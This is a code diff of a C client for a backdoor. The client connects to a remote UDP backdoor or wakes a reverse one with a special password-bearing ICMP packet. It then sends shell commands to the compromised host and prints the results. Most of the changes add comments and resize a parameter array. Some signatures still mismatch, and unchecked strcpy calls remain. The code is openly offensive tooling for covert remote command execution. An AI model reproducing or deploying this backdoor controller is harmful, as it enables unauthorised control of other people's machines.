@@ -46,7 +46,7 @@ void send_icmp_packet(int sock_fd, struct icmp_packet *packet_details);
 uint16_t in_cksum(uint16_t *addr, int len);
 void prepare_headers(struct iphdr *ip, struct icmphdr *icmp);
 void set_echo_type(struct icmp_packet *packet);
-void active_remote(char params[5][32]);
+void active_remote(char params[6][32]);
 /* endof ICMP Protocol Functions */
 
 int parse_internal_cmd(const char *buffer, char param[6][32]);
@@ -70,9 +70,8 @@ int main(int argc, char **argv) {
 			continue;
 		/* remove '\n' at the end */
 		cmd[strlen(cmd) - 1] = 0;
-		/* internal command list */
-		ret = parse_internal_cmd(cmd, params);
-		/* waiting for remote connection and active remote*/
+		ret = parse_internal_cmd(cmd, params);  //depart cmd
+		/* 4 internal commands,process by myself */
 		if (strcmp(params[0], "active") == 0) {
 			if (ret != 6) {
 				printf(	"usage: active self_IP target_IP passwd return_IP return_PORT\n");
@@ -88,7 +87,8 @@ int main(int argc, char **argv) {
 			nf.addr.sin_addr.s_addr = inet_addr(params[REVERSE_IP]);
 			bind(nf.udp_socket, (struct sockaddr *) &(nf.addr),
 					sizeof(nf.addr));
-			/* waiting for reverse bd connect*/
+			/*Create a thread to do receiveMSG which take back the result of function recvfrom.
+			The function recvfrom is block ,so create a thread .*/
 			pthread_create(&thread_id, NULL, (void *) receiveMSG, (void*) &nf);
 			flag = CONNECTED;
 			/* active remote reverse bd */
@@ -98,8 +98,8 @@ int main(int argc, char **argv) {
 		/* help command */
 		if (strcmp(params[0], "?") == 0) {
 			printf("Internal Command List:\n----------------------------\n");
-			printf("connect\n\t connect TO remote UDP BD\n");
-			printf("active\n\t use special ICMP package active reverse UDP BD\n");
+			printf("connect\n\t connect TO remote UDP BD\n");  //active connect
+			printf("active\n\t use special ICMP package active reverse UDP BD\n");  //passive connect
 			printf("close\n\t close all kinds of connections\n");
 			printf("byebye\n\t quit this program\n");
 			continue;
@@ -119,6 +119,8 @@ int main(int argc, char **argv) {
 			nf.addr.sin_family = AF_INET;
 			nf.addr.sin_port = htons(atoi(params[SERVER_PORT]));
 			nf.addr.sin_addr.s_addr = inet_addr(params[SERVER_IP]);
+			/*Create a thread to do receiveMSG which take back the result of function recvfrom.
+			The function recvfrom is block ,so create a thread .*/
 			pthread_create(&thread_id, NULL, (void *) receiveMSG, (void *) &nf);
 			flag = CONNECTED;
 			continue;
@@ -147,12 +149,14 @@ int main(int argc, char **argv) {
 		// process remote system shell command
 		if (flag == STANDBY)
 			continue;
+		/* external command (after "connect or active"),just send*/
 		sendto(nf.udp_socket, cmd, strlen(cmd), 0,
 				(struct sockaddr *) &(nf.addr), sizeof(nf.addr));
 	}
 	return EXIT_SUCCESS;
 }
 
+//tack back the result of recvfrom
 void receiveMSG(void *param) {
 	const int BUFFER_SIZE = 1024;
 	NET_INFO * nfp = (NET_INFO *) param;
@@ -176,7 +180,7 @@ int parse_internal_cmd(const char *buffer, char param[5][32]) {
 	const int MAX_COUNT = 6;
 	char backup[512];
 	strcpy(backup, buffer);
-	char *token = strtok(backup, " ");
+	char *token = strtok(backup, " ");  //depart according to space
 	int param_count = 0;
 	while (token != NULL && param_count < MAX_COUNT) {
 		strcpy(param[param_count], token);
